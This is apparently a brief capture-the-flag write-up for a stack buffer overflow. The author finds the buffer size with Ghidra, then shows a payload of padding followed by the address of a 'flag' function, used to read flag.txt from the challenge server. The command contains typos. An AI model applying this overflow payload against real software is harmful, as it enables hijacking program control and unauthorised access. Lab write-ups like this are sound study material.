Disassembled with ghidra the bin file and checked that the buffer was 216 locally (208 on server). We tested that if you put 220 "a" the program try to call a function at the address: "0x7f0061616161"
So i just used the command

```
pyton "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00"
```
To trigger it + make it run the function flag (address 0x04011d5) to theg the flag.txt from the server
